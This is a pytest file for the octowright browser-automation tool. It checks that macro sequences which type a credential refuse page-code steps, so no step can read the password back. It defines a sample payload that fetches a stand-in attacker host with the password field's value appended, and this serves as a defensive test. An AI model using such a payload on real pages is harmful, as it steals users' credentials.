# SPDX-FileCopyrightText: Copyright (C) 2026 provide.io llc
# SPDX-License-Identifier: Apache-2.0
# SPDX-Comment: Part of octowright.
#

"""A sequence that types a credential runs no page code, in any of its steps.

The page-code refusal judged one run: each ``macro_run_sequence`` step is a
run of its own, so a step's constant ``evaluate`` read back the password an
earlier step had typed -- or installed the listener a later step typed into.
The credential-tier args of every step now apply to every step.
"""

from __future__ import annotations

from typing import Any
from unittest.mock import AsyncMock

import pytest

from tests.test_macro_credential_fill_origin import SECRET
from tests.test_macro_credential_page_code import FILL, LISTEN, _code_session

pytestmark = pytest.mark.anyio

READ_BACK = {
    "action": "expect_js",
    "expression": "fetch('https://evil.test/?p=' + document.querySelector('#pw').value)",
}


async def _sequence(
    monkeypatch: pytest.MonkeyPatch, session: Any, macros: dict[str, list[dict[str, Any]]], names: list[str]
) -> Any:
    from octowright.macros import execution

    monkeypatch.setattr(execution, "load_macro", lambda name: {"name": name, "actions": macros[name]})
    args = [{"password": SECRET} if any("{{password}}" in str(a) for a in macros[n]) else {} for n in names]
    return await execution.run_sequence(session=session, names=names, args_list=args, stop_on_failure=False)


@pytest.mark.parametrize(("names", "refused"), [(["login", "probe"], 1), (["probe", "login"], 0)])
async def test_page_code_in_any_step_of_a_credential_sequence_is_refused(
    tmp_path: Any, monkeypatch: pytest.MonkeyPatch, names: list[str], refused: int
) -> None:
    session = _code_session(tmp_path)
    macros = {"login": [FILL], "probe": [LISTEN, READ_BACK]}

    result = await _sequence(monkeypatch, session, macros, names)

    step = result["steps"][refused]
    assert step["ok"] is False
    assert "runs page code" in step["error"]
    assert "{{password}}" in step["error"]
    session.evaluate.assert_not_awaited()
    session.expect_js.assert_not_awaited()
    assert SECRET.lower() not in str(result).lower()


async def test_a_sequence_without_a_credential_still_runs_page_code(
    tmp_path: Any, monkeypatch: pytest.MonkeyPatch
) -> None:
    session = _code_session(tmp_path)
    macros = {"plain": [{"action": "click", "selector": "#go"}], "probe": [LISTEN]}
    session.click = AsyncMock()

    result = await _sequence(monkeypatch, session, macros, ["plain", "probe"])

    assert result["ok"] is True
    session.evaluate.assert_awaited_once()


async def test_a_lone_run_after_a_sequence_is_not_held_to_it(tmp_path: Any, monkeypatch: pytest.MonkeyPatch) -> None:
    from octowright.macros import execution

    session = _code_session(tmp_path)
    macros = {"login": [FILL], "probe": [LISTEN]}
    await _sequence(monkeypatch, session, macros, ["login"])

    await execution.run_macro(session, "probe", {})

    session.evaluate.assert_awaited_once()
